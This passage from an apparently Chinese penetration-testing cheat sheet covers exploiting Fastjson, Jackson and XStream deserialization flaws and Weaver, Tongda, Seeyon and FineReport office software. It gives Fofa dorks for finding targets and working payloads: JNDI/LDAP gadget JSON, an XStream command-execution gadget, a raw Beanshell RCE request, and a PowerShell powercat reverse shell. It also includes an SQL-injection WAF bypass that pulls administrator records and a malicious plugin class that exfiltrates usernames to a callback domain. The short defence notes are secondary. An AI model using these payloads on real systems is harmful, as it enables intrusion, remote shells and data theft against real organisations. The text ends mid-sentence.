https://mp.weixin.qq.com/s/RShHui_TJeZM7-frzCfH7Q\n4. Fofa Dork\n5. 漏洞分析\nFastjson \u0026lt;=1.2.47 远程代码执行漏洞分析 – 安全客, 安全资讯平台 https://www.anquanke.com/post/id/181874\n6. 漏洞利用\n1.JDK降级编译\nCaijiOrz/fastjson-1.2.47-RCE: Fastjson \u0026lt;= 1.2.47 远程命令执行漏洞利用工具及方法 https://github.com/CaijiOrz/fastjson-1.2.47-RCE\n源项目中最后一句\n当javac版本和目标服务器差太多, 会报一个这样得到错误, 所以需要使用1.8的javac来编译Exploit.java\n这里并不需要更换jdk版本, 我们可以使用JDK降级编译的手法, 这样1.8的jdk也可以编译出来1.7版本的.class , 相信可以解决很多小伙伴的问题\njavac -source 1.7 -target 1.7 Exploit.java\n1.2.47版本以下通杀Poc:\n{\u0026quot;name\u0026quot;:{\u0026quot;@type\u0026quot;:\u0026quot;java.lang.Class\u0026quot;, \u0026quot;val\u0026quot;:\u0026quot;com.sun.rowset.JdbcRowSetImpl\u0026quot;}, \u0026quot;f\u0026quot;:{\u0026quot;@type\u0026quot;:\u0026quot;com.sun.rowset.JdbcRowSetImpl\u0026quot;, \u0026quot;dataSourceName\u0026quot;:\u0026quot;ldap://asdfasfd/\u0026quot;, \u0026quot;autoCommit\u0026quot;:true}}, age:11}\n其中{\u0026quot;@type\u0026quot;:\u0026quot;com.sun.rowset.JdbcRowSetImpl\u0026quot;, \u0026quot;dataSourceName\u0026quot;:\u0026quot;ldap://asdfasfd/\u0026quot;, \u0026quot;autoCommit\u0026quot;:true}也可以替换成其他利用链\n2.优先使用LDAP协议\n根据实战中经验, 这里更推荐使用ldap协议进行漏洞利用, 原因如下\nRMI协议的利用方式 在JDK 6u132/7u122/8u113 及以上版本中修复了 LDAP协议的利用方式 在JDK 6u211/7u201/8u191 及以上版本中修复了\n所以,LDAP的利用方式要优于RMI, 且LDAP可以直接返回序列化对象, 绕过更高版本的JDK限制\n如何绕过高版本JDK的限制进行JNDI注入 – FreeBuf专栏·安全引擎 https://www.freebuf.com/column/207439.html\n7. 利用技巧\n1.如何查看服务器的jdk版本呢, 这里也有个小技巧\nnc -lvvp 80#[marshalsec中指定的HTTP端口]\n当服务器连接过来时, User-Agent中会标明当前服务器的JDK版本\n2.当发现一台Redis的数据中有@type字样时, 意味着autotype大概率是开的, 只要不存在黑名单中的利用链都可以用#[同理可以用在jackson上]\nfastjson/GenericFastJsonRedisSerializer.java at master · alibaba/fastjson https://github.com/alibaba/fastjson/blob/master/src/main/java/com/alibaba/fastjson/support/spring/GenericFastJsonRedisSerializer.java\n1 2 3 public class GenericFastJsonRedisSerializer implements RedisSerializer\u0026lt;Object\u0026gt; { private final static ParserConfig defaultRedisConfig = new ParserConfig(); static { defaultRedisConfig.setAutoTypeSupport(true);} 其他消息队列之类的都是同理\n8. 防护方法\n1.升级Fastjson到最新版(\u0026gt;=1.2.68 新增了safemode, 彻底关闭autotype) 2.WAF拦截过滤请求包中的 @type, %u0040%u0074%u0079%u0070%u0065, \\u0040type, \\x04type 等多种编码的autotype变形\n3.最少升级到1.2.48以上版本且关闭autotype选项\n4.升级对应JDK版本到 8u191/7u201/6u211/11.0.1 以上\nJackson 反序列化远程代码执行漏洞 1. 漏洞简介\nJackson 跟Fastjson一样, 当enableDefaultTyping开启时, 也是可以进行反序列化到代码执行\n2. 影响组件 Jackson\n3. 漏洞指纹\n无损检测Fastjson DoS漏洞以及盲区分Fastjson与Jackson组件 – 斗象能力中心 (\u0026lt;1.2.60) https://blog.riskivy.com/%e6%97%a0%e6%8d%9f%e6%a3%80%e6%b5%8bfastjson-dos%e6%bc%8f%e6%b4%9e%e4%bb%a5%e5%8f%8a%e7%9b%b2%e5%8c%ba%e5%88%86fastjson%e4%b8%8ejackson%e7%bb%84%e4%bb%b6/\n4. Fofa Dork\n5. 漏洞分析\n跟Fastjson漏洞原理都是一样的, 每次修复基本都是更新黑名单, 漏洞分析可以参考\nJackson-databind-2670远程代码执行漏洞简单分析 – 先知社区 https://xz.aliyun.com/t/7506\n6. 漏洞利用\nlearnjavabug/jackson/src/main/java/com/threedr3am/bug/jackson at master · threedr3am/learnjavabug https://github.com/threedr3am/learnjavabug/tree/master/jackson/src/main/java/com/threedr3am/bug/jackson\nPOC\n[\u0026quot;ch.qos.logback.core.db.JNDIConnectionSource\u0026quot;, {\u0026quot;jndiLocation\u0026quot;:\u0026quot;ldap://localhost:43658/Calc\u0026quot;}]\n7. 利用技巧\n1.把Fastjson的利用链拿过来改一改就可以用, 前提是环境中存在可用的利用链\n8. 防护方法\n1.升级Jackson到最新版(enableDefaultTyping默认都是关的, 问题不大)\n2.确保enableDefaultTyping是关闭的\n3.升级对应JDK版本到 8u191/7u201/6u211/11.0.1 以上\nXstream 反序列化漏洞 1. 漏洞简介\nXstream Java 中经常用于处理 xml 的库, 最近一次修复中(1.4.10版本)重现了历史反序列化远程代码执行漏洞, 所以也需要关注\n2. 影响组件\nXstream \u0026lt;1.4.6, =1.4.10\n3. 漏洞指纹\nxml\n4. Fofa Dork\n5. 漏洞分析\nXStream反序列化组件攻击分析 | angelwhu_blog https://www.angelwhu.com/paper/2016/03/15/xstream-deserialization-component-attack-analysis/#0x04-Jenkins￥ﾈﾩ￧ﾔﾨ\n6. 漏洞利用\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 import com.thoughtworks.xstream.XStream; import java.io.IOException; public class Main { // POC1 public static void main(String[] args) throws IOException { XStream xStream = new XStream(); String payload = \u0026#34;\u0026lt;sorted-set\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;string\u0026gt;foo\u0026lt;/string\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;dynamic-proxy\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;interface\u0026gt;java.lang.Comparable\u0026lt;/interface\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;handler class=\\\u0026#34;java.beans.EventHandler\\\u0026#34;\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;target class=\\\u0026#34;java.lang.ProcessBuilder\\\u0026#34;\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;command\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;string\u0026gt;cmd.exe\u0026lt;/string\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;string\u0026gt;/c\u0026lt;/string\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;string\u0026gt;calc\u0026lt;/string\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;/command\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;/target\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;action\u0026gt;start\u0026lt;/action\u0026gt;\u0026#34;+ \u0026#34; \u0026lt;/handler\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;/dynamic-proxy\u0026gt;\\n\u0026#34; + \u0026#34;\u0026lt;/sorted-set\u0026gt;\\n\u0026#34;; //POC2 // String payload = \u0026#34;\u0026lt;java.util.PriorityQueue serialization=\\\u0026#34;custom\\\u0026#34;\u0026gt;\\n\u0026#34; + // \u0026#34; \u0026lt;unserializable-parents/\u0026gt;\\n\u0026#34; + // \u0026#34; \u0026lt;java.util.PriorityQueue\u0026gt;\\n\u0026#34; + // \u0026#34; \u0026lt;default\u0026gt;\\n\u0026#34; + // \u0026#34; \u0026lt;size\u0026gt;2\u0026lt;/size\u0026gt;\\n\u0026#34; + // \u0026#34; \u0026lt;comparator class=\\\u0026#34;org.apache.commons.beanutils.BeanComparator\\\u0026#34;\u0026gt;\\n\u0026#34; + // \u0026#34; \u0026lt;property\u0026gt;databaseMetaData\u0026lt;/property\u0026gt;\\n\u0026#34; + // \u0026#34; \u0026lt;comparator class=\\\u0026#34;java.util.Collections$ReverseComparator\\\u0026#34;/\u0026gt;\\n\u0026#34; + // \u0026#34; \u0026lt;/comparator\u0026gt;\\n\u0026#34; + // \u0026#34; \u0026lt;/default\u0026gt;\\n\u0026#34; + // \u0026#34; \u0026lt;int\u0026gt;3\u0026lt;/int\u0026gt;\\n\u0026#34; + // \u0026#34; \u0026lt;com.sun.rowset.JdbcRowSetImpl serialization=\\\u0026#34;custom\\\u0026#34;\u0026gt;\\n\u0026#34; + // \u0026#34; \u0026lt;javax.sql.rowset.BaseRowSet\u0026gt;\\n\u0026#34; + // \u0026#34; \u0026lt;default\u0026gt;\\n\u0026#34; + // \u0026#34; \u0026lt;concurrency\u0026gt;1008\u0026lt;/concurrency\u0026gt;\\n\u0026#34; + // \u0026#34; \u0026lt;escapeProcessing\u0026gt;true\u0026lt;/escapeProcessing\u0026gt;\\n\u0026#34; + // \u0026#34; \u0026lt;fetchDir\u0026gt;1000\u0026lt;/fetchDir\u0026gt;\\n\u0026#34; + // \u0026#34; \u0026lt;fetchSize\u0026gt;0\u0026lt;/fetchSize\u0026gt;\\n\u0026#34; + // \u0026#34; \u0026lt;isolation\u0026gt;2\u0026lt;/isolation\u0026gt;\\n\u0026#34; + // \u0026#34; \u0026lt;maxFieldSize\u0026gt;0\u0026lt;/maxFieldSize\u0026gt;\\n\u0026#34; + // \u0026#34; \u0026lt;maxRows\u0026gt;0\u0026lt;/maxRows\u0026gt;\\n\u0026#34; + // \u0026#34; \u0026lt;queryTimeout\u0026gt;0\u0026lt;/queryTimeout\u0026gt;\\n\u0026#34; + // \u0026#34; \u0026lt;readOnly\u0026gt;true\u0026lt;/readOnly\u0026gt;\\n\u0026#34; + // \u0026#34; \u0026lt;rowSetType\u0026gt;1004\u0026lt;/rowSetType\u0026gt;\\n\u0026#34; + // \u0026#34; \u0026lt;showDeleted\u0026gt;false\u0026lt;/showDeleted\u0026gt;\\n\u0026#34; + // \u0026#34; \u0026lt;dataSource\u0026gt;ldap://ip:1389/Object\u0026lt;/dataSource\u0026gt;\\n\u0026#34; + // \u0026#34; \u0026lt;params/\u0026gt;\\n\u0026#34; + // \u0026#34; \u0026lt;/default\u0026gt;\\n\u0026#34; + // \u0026#34; \u0026lt;/javax.sql.rowset.BaseRowSet\u0026gt;\\n\u0026#34; + // \u0026#34; \u0026lt;com.sun.rowset.JdbcRowSetImpl\u0026gt;\\n\u0026#34; + // \u0026#34; \u0026lt;default\u0026gt;\\n\u0026#34; + // \u0026#34; \u0026lt;iMatchColumns\u0026gt;\\n\u0026#34; + // \u0026#34; \u0026lt;int\u0026gt;-1\u0026lt;/int\u0026gt;\\n\u0026#34; + // \u0026#34; \u0026lt;int\u0026gt;-1\u0026lt;/int\u0026gt;\\n\u0026#34; + // \u0026#34; \u0026lt;int\u0026gt;-1\u0026lt;/int\u0026gt;\\n\u0026#34; + // \u0026#34; \u0026lt;int\u0026gt;-1\u0026lt;/int\u0026gt;\\n\u0026#34; + // \u0026#34; \u0026lt;int\u0026gt;-1\u0026lt;/int\u0026gt;\\n\u0026#34; + // \u0026#34; \u0026lt;int\u0026gt;-1\u0026lt;/int\u0026gt;\\n\u0026#34; + // \u0026#34; \u0026lt;int\u0026gt;-1\u0026lt;/int\u0026gt;\\n\u0026#34; + // \u0026#34; \u0026lt;int\u0026gt;-1\u0026lt;/int\u0026gt;\\n\u0026#34; + // \u0026#34; \u0026lt;int\u0026gt;-1\u0026lt;/int\u0026gt;\\n\u0026#34; + // \u0026#34; \u0026lt;int\u0026gt;-1\u0026lt;/int\u0026gt;\\n\u0026#34; + // \u0026#34; \u0026lt;/iMatchColumns\u0026gt;\\n\u0026#34; + // \u0026#34; \u0026lt;strMatchColumns\u0026gt;\\n\u0026#34; + // \u0026#34; \u0026lt;string\u0026gt;foo\u0026lt;/string\u0026gt;\\n\u0026#34; + // \u0026#34; \u0026lt;null/\u0026gt;\\n\u0026#34; + // \u0026#34; \u0026lt;null/\u0026gt;\\n\u0026#34; + // \u0026#34; \u0026lt;null/\u0026gt;\\n\u0026#34; + // \u0026#34; \u0026lt;null/\u0026gt;\\n\u0026#34; + // \u0026#34; \u0026lt;null/\u0026gt;\\n\u0026#34; + // \u0026#34; \u0026lt;null/\u0026gt;\\n\u0026#34; + // \u0026#34; \u0026lt;null/\u0026gt;\\n\u0026#34; + // \u0026#34; \u0026lt;null/\u0026gt;\\n\u0026#34; + // \u0026#34; \u0026lt;null/\u0026gt;\\n\u0026#34; + // \u0026#34; \u0026lt;/strMatchColumns\u0026gt;\\n\u0026#34; + // \u0026#34; \u0026lt;/default\u0026gt;\\n\u0026#34; + // \u0026#34; \u0026lt;/com.sun.rowset.JdbcRowSetImpl\u0026gt;\\n\u0026#34; + // \u0026#34; \u0026lt;/com.sun.rowset.JdbcRowSetImpl\u0026gt;\\n\u0026#34; + // \u0026#34; \u0026lt;com.sun.rowset.JdbcRowSetImpl reference=\\\u0026#34;../com.sun.rowset.JdbcRowSetImpl\\\u0026#34;/\u0026gt;\\n\u0026#34; + // \u0026#34; \u0026lt;/java.util.PriorityQueue\u0026gt;\\n\u0026#34; + // \u0026#34;\u0026lt;/java.util.PriorityQueue\u0026gt;\u0026#34;; xStream.fromXML(payload); } } 7. 利用技巧\n1.这里 Xstream 同样影响很多使用它的开源组件, 比如Spring系列\nMaven Repository: com.thoughtworks.xstream » xstream » 1.4.10 (Usages) https://mvnrepository.com/artifact/com.thoughtworks.xstream/xstream/1.4.10/usages\n2.xml 不仅可以xxe, 还能反序列化代码执行\n2.xxe 漏洞用 xxer, 方便快捷\nTheTwitchy/xxer: A blind XXE injection callback handler. Uses HTTP and FTP to extract information. Originally written in Ruby by ONsec-Lab. https://github.com/TheTwitchy/xxer\n8. 防护方法\n1.升级到最新版\n泛微OA Bsh 远程代码执行漏洞 1. 漏洞简介\n2019年9月17日泛微OA官方更新了一个远程代码执行漏洞补丁, 泛微e-cology OA系统的Java Beanshell接口可被未授权访问, 攻击者调用该Beanshell接口, 可构造特定的HTTP请求绕过泛微本身一些安全限制从而达成远程命令执行, 漏洞等级严重.\n2. 影响组件 泛微OA\n3. 漏洞指纹\nSet-Cookie: ecology_JSessionId=\necology\n/weaver/bsh.servlet.BshServlet\n4. Fofa Dork\napp=\u0026quot;泛微-协同办公OA\u0026quot;\n5. 漏洞分析\n泛微OA E-cology远程代码执行漏洞原理分析 – FreeBuf互联网安全新媒体平台 https://www.freebuf.com/vuls/215218.html\nhttps://github.com/beanshell/beanshell\nhttp://beanshell.org/manual/quickstart.html#The_BeanShell_GUI\n6. 漏洞利用\nVulnerability-analysis/0917/weaver-oa/CNVD-2019-32204 at master · myzing00/Vulnerability-analysis https://github.com/myzing00/Vulnerability-analysis/tree/master/0917/weaver-oa/CNVD-2019-32204\n1 2 3 4 5 6 7 8 9 10 POST /weaver/bsh.servlet.BshServlet HTTP/1.1 Host: xxxxxxxx:8088 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Length: 98 Content-Type: application/x-www-form-urlencoded bsh.script=eval%00(\u0026#34;ex\u0026#34;%2b\u0026#34;ec(\\\u0026#34;whoami\\\u0026#34;)\u0026#34;);\u0026amp;bsh.servlet.captureOutErr=true\u0026amp;bsh.servlet.output=raw 7. 利用技巧\n1.其他形式绕过\neval%00(\u0026quot;ex\u0026quot;%2b\u0026quot;ec(\\\u0026quot;whoami\\\u0026quot;)\u0026quot;); 也可以换成 ex\\u0065c(\u0026quot;cmd /c dir\u0026quot;);\n2.泛微多数都是windows环境, 反弹shell可以使用pcat\npowershell IEX(New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c ip -p 6666 -e cmd\n8. 防护方法\n1.及时更新泛微补丁\n2.拦截/weaver/bsh.servlet.BshServlet目录的访问\n泛微OA e-cology SQL注入漏洞 1. 漏洞简介\n泛微OA 在国内的用户很多, 漏洞以前也很多, 但现在在漏洞盒子托管了企业SRC https://weaversrc.vulbox.com/, 情况有所好转\n2. 影响组件\n泛微OA\n3. 漏洞指纹\nSet-Cookie: ecology_JSessionId=\necology\nWorkflowCenterTreeData\n/mobile/plugin/SyncUserInfo.jsp\n4. Fofa Dork\napp=\u0026quot;泛微-协同办公OA\u0026quot;\n5. 漏洞分析\n泛微OA WorkflowCenterTreeData接口注入漏洞(限oracle数据库) – 先知社区 https://xz.aliyun.com/t/6531\n6. 漏洞利用\n泛微OA e-cology WorkflowCenterTreeData前台接口SQL注入漏洞复现数据库小龙人-CSDN博客 https://blog.csdn.net/zycdn/article/details/102494037\nTentacle/ecology8_mobile_sql_inject.py at 6e1cecd52b10526c4851a26249339367101b3ca2 · orleven/Tentacle https://github.com/orleven/Tentacle/blob/6e1cecd52b10526c4851a26249339367101b3ca2/script/ecology/ecology8_mobile_sql_inject.py\n应用安全 – 软件漏洞 – 泛微OA漏洞汇总 – AdreamWillB – 博客园 https://www.cnblogs.com/AtesetEnginner/p/11558469.html\n/mobile/plugin/SyncUserInfo.jsp 这个也是有问题的, 但由于没有公开的分析报告, 漏洞相对简单, 这里不过多描述\n7. 利用技巧\n1.在这个漏洞补丁之前大概有几十个前台注入, 都差不多, 因为没公开这里就不细说了\n2.泛微的补丁中间改过一次过滤策略, 打完所有补丁的话, 注入就很难了\n3.这里可以绕过的原因是泛微某个过滤器初始化错误, 当长度超过xssMaxLength=500的时候就不进入安全检测, 修复以后是xssMaxLength=1000000, 所以随便你填充%0a%0d还是空格都可以绕过注入检测\n4.泛微后端数据库版本存在差异, 但是可以通用检测\n已知泛微OA E8存在2个版本的数据库, 一个是mssql, 一个是oracle, 且新旧版本泛微的sql过滤方法并不一致\n所以这里筛选出一个相对通用的检测手法(下面代码是python的\u0026quot; \u0026quot;*800 800个空格)\n\u0026quot;-1) \u0026quot;+\u0026quot; \u0026quot;*800+ \u0026quot;union select/**/1, Null, Null, Null, Null, Null, Null, Null from Hrmresourcemanager where loginid=('sysadmin'\u0026quot;\n老版本可以在关键字后面加 /**/ 来绕过sql检测\n新版本可以通过加入大量空格/换行来绕过sql检测\nmssql, oracle中都有Hrmresourcemanager , 这是管理员信息表\n就Hrmresource表中没有用户, Hrmresourcemanager 表中也一定会存在sysadmin账户\n所以进行union select的时候一定会有数据\n这里也可以使用 \u0026quot;-1) \u0026quot;+\u0026quot; \u0026quot;*800+ \u0026quot; or/**/ 1=1 and id\u0026lt;(5\u0026quot;\n这里使用 \u0026lt;5 可以避免信息超过5条, 但是会返回密码等敏感信息, 不建议使用\n8. 防护方法\n1.及时更新泛微补丁 2.泛微最好不要开放到公网 3.使用waf拦击\n泛微OA 数据库泄露漏洞 1. 漏洞简介\n泛微OA 在国内的用户很多, 漏洞以前也很多, 但现在在漏洞盒子托管了企业SRC https://weaversrc.vulbox.com/, 情况有所好转\n2. 影响组件\n泛微OA\n3. 漏洞指纹\nSet-Cookie: ecology_JSessionId=\necology\n/mobile/DBconfigReader.jsp\n4. Fofa Dork\napp=\u0026quot;泛微-协同办公OA\u0026quot;\n5. 漏洞分析\njas502n/DBconfigReader: 泛微ecology OA系统接口存在数据库配置信息泄露漏洞 https://github.com/jas502n/DBconfigReader\n6. 漏洞利用\nlinbing/Weaver_Ecology_Oa_Config.py at master · taomujian/linbing https://github.com/taomujian/linbing/blob/master/flask/app/plugins/Weaver%20Ecology%20OA/Weaver_Ecology_Oa_Config.py\n7. 利用技巧\n1.虽然是接口返回数据是加密的, 但是因为硬编码密钥的缘故, 解密也很简单, pydes就可以解密, 只是这里pydes本身有个bug, 修复方式 pyDes.des(' ') 2.这里解密出来的密码一般都是泛微默认的, 且数据库监听在127.0.0.1上, 用处看个人发挥了 3.此外泛微还有一些漏洞, 但是基本最新版都修复了, 由于没公开过, 就让他消失吧\n8. 防护方法\n1.及时更新泛微补丁\n2.泛微最好不要开放到公网\n3.使用waf拦截sql注入\n通达OA 远程代码执行漏洞 1. 漏洞简介\n通达OA 在国内的用户也比较多, 虽说代码加了密, 奈何是Zend5.4, 解码很简单, 然后代码中的漏洞就很清楚, 尤其是变量覆盖和注入\n2. 影响组件 通达OA\n3. 漏洞指纹\n\u0026quot;/images/tongda.ico\u0026quot;\u0026gt;\nOffice Anywhere 20xx版 网络智能办公系统\n/ispirit/interface/gateway.php\n4. Fofa Dork\napp=\u0026quot;通达OA\u0026quot;\n5. 漏洞分析\nnote/readme.md at c28f7b232ad5f0ff7ccc672bbedcd34e9e3cca86 · leezp/note https://github.com/leezp/note/blob/c28f7b232ad5f0ff7ccc672bbedcd34e9e3cca86/20200313%E9%80%9A%E8%BE%BEOA/readme.md\n代码审计 | 通达OA 任意用户登录漏洞（匿名RCE）分析 | zrools https://www.zrools.org/2020/04/23/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E9%80%9A%E8%BE%BEOA-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%EF%BC%88%E5%8C%BF%E5%90%8DRCE%EF%BC%89%E5%88%86%E6%9E%90/\n6. 漏洞利用\nnote/readme.md at c28f7b232ad5f0ff7ccc672bbedcd34e9e3cca86 · leezp/note https://github.com/leezp/note/blob/c28f7b232ad5f0ff7ccc672bbedcd34e9e3cca86/20200313%E9%80%9A%E8%BE%BEOA/readme.md\nNS-Sp4ce/TongDaOA-Fake-User: 通达OA 任意用户登录漏洞 https://github.com/NS-Sp4ce/TongDaOA-Fake-User\ntools/tongda_v11.4_rce_exp.py at master · zrools/tools 管理员伪造后sql写shell https://github.com/zrools/tools/blob/master/python/tongda_v11.4_rce_exp.py\n7. 利用技巧\n1.这个漏洞也很简单, 发预警的当天就分析出来了, 一个上传, 一个包含, 主要是文件包含漏洞的/ispirit/interface/gateway.php文件在v11才有\n绕过disable_function也很简单, 直接调用COM('WScript.shell')组件就ok了\n2.文件名结构规则如下\n256@2003_ 2055499620|123. php.\n对应文件名为\nattach/im/2003/2055499620.123.php\n因为是windows的, 1.php. 可以绕过黑名单, 写到文件就成了 1.php (这里是文件包含, 文件名无所谓)\n3.2020年4月20号爆出任意用户伪造登录, 这里小伙伴测试 2017 和 v11 的 poc 好像可以用同一个\n(我们看标题挖漏洞, 全网第一时间推送了带复现截图的漏洞通告, 也引发了大家不少讨论)\n通达OA前台任意用户伪造登录漏洞 https://vas.riskivy.com/vuln-detail?id=33\nNS-Sp4ce/TongDaOA-Fake-User: 通达OA 任意用户登录漏洞 https://github.com/NS-Sp4ce/TongDaOA-Fake-User\n8. 防护方法\n1.及时更新补丁\n2.使用waf拦截\n致远 OA A8 htmlofficeservlet getshell 漏洞 1. 漏洞简介\n致远 OA 在国内的用户也比较多, 2019年攻防演练暴出来 htmlofficeservlet getshell 漏洞\n2. 影响组件 致远 OA\n3. 漏洞指纹\n/seeyon/htmlofficeservlet\n/seeyon/index.jsp\nseeyon\n4. Fofa Dork\napp=\u0026quot;用友-致远OA\u0026quot;\n5. 漏洞分析\n致远 OA A8 htmlofficeservlet getshell (POC\u0026amp;EXP) – Reber’s Blog http://wyb0.com/posts/2019/seeyon-htmlofficeservlet-getshell/\n6. 漏洞利用\ntimwhitez/seeyon-OA-A8-GetShell: 致远OA A8 某些版本批量getshell漏洞/seeyon OA A8 some version getshell from url list https://github.com/timwhitez/seeyon-OA-A8-GetShell\n致远 OA A8 htmlofficeservlet getshell (POC\u0026amp;EXP) – Reber’s Blog http://wyb0.com/posts/2019/seeyon-htmlofficeservlet-getshell/\n这里还有个XXE\n致远OA帆软报表组件前台XXE漏洞(0day)挖掘过程 LandGrey’s Blog https://landgrey.me/blog/8/\n7. 利用技巧\n1.这个漏洞也挺有意思的, 这个接口是一个金格iweboffice用来处理文件的, 属于一个第三方接口暴露导致的安全问题\n这个漏洞网传的脚本都是一个文件名test123456.jsp, 很容易被人锤啊\n这里贴一个小脚本可以加解密文件名属性之类的, 算法也很简单, 漏洞通告的当天就写出来了, 就是一个换了码表的base64\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 from sys import argv letters = \u0026#34;gx74KW1roM9qwzPFVOBLSlYaeyncdNbI=JfUCQRHtj2+Z05vshXi3GAEuT/m8Dpk6\u0026#34; def base64_encode(input_str): str_ascii_list = [\u0026#39;{:0\u0026gt;8}\u0026#39;.format(str(bin(ord(i))).replace(\u0026#39;0b\u0026#39;, \u0026#39;\u0026#39;)) for i in input_str] output_str = \u0026#39;\u0026#39; equal_num = 0 while str_ascii_list: temp_list = str_ascii_list[:3] if len(temp_list) != 3: while len(temp_list) \u0026lt; 3: equal_num += 1 temp_list += [\u0026#39;0\u0026#39; * 8] temp_str = \u0026#39;\u0026#39;.join(temp_list) temp_str_list = [temp_str[x:x + 6] for x in [0, 6, 12, 18]] temp_str_list = [int(x, 2) for x in temp_str_list] if equal_num: temp_str_list = temp_str_list[0:4 - equal_num] output_str += \u0026#39;\u0026#39;.join([letters[x] for x in temp_str_list]) str_ascii_list = str_ascii_list[3:] output_str = output_str + \u0026#39;=\u0026#39; * equal_num return output_str def base64_decode(input_str): str_ascii_list = [\u0026#39;{:0\u0026gt;6}\u0026#39;.format(str(bin(letters.index(i))).replace(\u0026#39;0b\u0026#39;, \u0026#39;\u0026#39;)) for i in input_str if i != \u0026#39;=\u0026#39;] output_str = \u0026#39;\u0026#39; equal_num = input_str.count(\u0026#39;=\u0026#39;) while str_ascii_list: temp_list = str_ascii_list[:4] temp_str = \u0026#39;\u0026#39;.join(temp_list) if len(temp_str) % 8 != 0: temp_str = temp_str[0:-1 * equal_num * 2] temp_str_list = [temp_str[x:x + 8] for x in [0, 8, 16]] temp_str_list = [int(x, 2) for x in temp_str_list if x] output_str += \u0026#39;\u0026#39;.join([chr(x) for x in temp_str_list]) str_ascii_list = str_ascii_list[4:] return output_str if __name__ == \u0026#34;__main__\u0026#34;: if len(argv) == 2: print(base64_decode(argv[1])) elif len(argv) == 3: if argv[1] == \u0026#39;-d\u0026#39;: print(base64_decode(argv[2])) else: print(base64_encode(argv[2])) else: print(\u0026#34;Seeyon OA /seeyon/htmlofficeservlet param encode/decode\u0026#34;) print(\u0026#34;Usage:\u0026#34;) print(\u0026#34;python %s encoded_str\u0026#34; % argv[0])t print(\u0026#34;python %s -d encoded_str\u0026#34; % argv[0]) print(\u0026#34;python %s -e raw_str\u0026#34; % argv[0]) 8. 防护方法\n1.及时更新补丁\n2.使用waf拦截\n[致远OA] 帆软报表 seeyonreport 远程代码执行 1. 漏洞简介\n帆软报表 (seeyonreport) 很多时候会跟合致远OA一起出现, 通常用户还不知道, 所以这里有几个漏洞点\n2. 影响组件\n帆软报表 seeyonreport\n3. 漏洞指纹\nhttps://seeyoon.com/seeyonreport/ReportServer?op=fs_load\u0026amp;cmd=fs_signin\u0026amp;_=1560911828892\nseeyonreport\n4. Fofa Dork\napp=\u0026quot;用友-致远OA\u0026quot;\n5. 漏洞分析\n帆软报表v8.0 Getshell漏洞分析 | ADog’s Blog http://foreversong.cn/archives/1378\n6. 漏洞利用\n帆软报表v8.0 Getshell漏洞分析 | ADog’s Blog http://foreversong.cn/archives/1378\nxray/finereport-directory-traversal.yml at master · chaitin/xray https://github.com/chaitin/xray/blob/master/pocs/finereport-directory-traversal.yml 7. 利用技巧\n1.未设置密码或者读取读取管理员密码 https://seeyoon.com/seeyonreport/ReportServer?op=fs_load\u0026cmd=fs_signin\u0026_=1560911828892\n这里很有可能是没有设置密码的, 修改密码进入后台就可以了\n如果设置里密码, 尝试这个接口 /report/ReportServer?op=chart\u0026amp;cmd=get_geo_json\u0026amp;resourcepath=privilege.xml, 读取管理员密码, 然后使用上文的解密程序解密\n2.后台getshell 这种后台能装插件的都随便getshell\n先去下载一个指定版本的jar包\n本地测试环境是9.0\n下载com.fr.plugin.external-1.3.4.zip https://shop.finereport.com/plugin/2d36b210-2a59-4940-8c4f-f3f16d58cd66\nhttp://shopps.finereport.com/com.fr.plugin.external-1.3.4.zip?e=1561433162\u0026token=GYG9vMioxqbEgx-5HoAMAelD0zGdUrXT4UZ3w-d1:N-PeIkhKkjCY7LHdqelnSvp_LmA=\n编译一个恶意的class打包进去\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 package com.fr.plugin.external.locale; import java.io.IOException; import java.lang.Runtime; import java.lang.Process; public class LocaleFinder { public LocaleFinder() throws IOException, InterruptedException { String[] commands; if(System.getProperty(\u0026#34;os.name\u0026#34;).toLowerCase().contains(\u0026#34;win\u0026#34;)) { commands = new String[]{\u0026#34;C:\\\\Windows\\\\System32\\\\cmd\u0026#34;, \u0026#34;/c\u0026#34;, \u0026#34;ping -nc 3 %username%.win.seeyonreport.ceyedoamin.ceye.io\u0026#34;}; } else { commands = new String[]{\u0026#34;/bin/sh\u0026#34;, \u0026#34;-c\u0026#34;, \u0026#34;curl `whoami`.linux.seeyonreport.ceyedoamin.ceye.io\u0026#34;}; } Runtime rt = Runtime.getRuntime(); Process pc = rt.exec(commands); pc.waitFor(); } public static void main(String[] argv) throws IOException, InterruptedException { LocaleFinder e = new LocaleFinder(); } } 复制LocaleFinder.class到 \\com.fr.plugin.external-1.3.4.zip\\fr-plugin-external-1.3.4\\fr-plugin-external-1.3.4.jar\\com\\fr\\plugin\\external\\locale\\\n进入到插件管理界面, 上传符合规范的jar包插件即可 没生效就访问一下 https://xxxx/seeyonreport/ReportServer?op=im\n一般后台都是win, 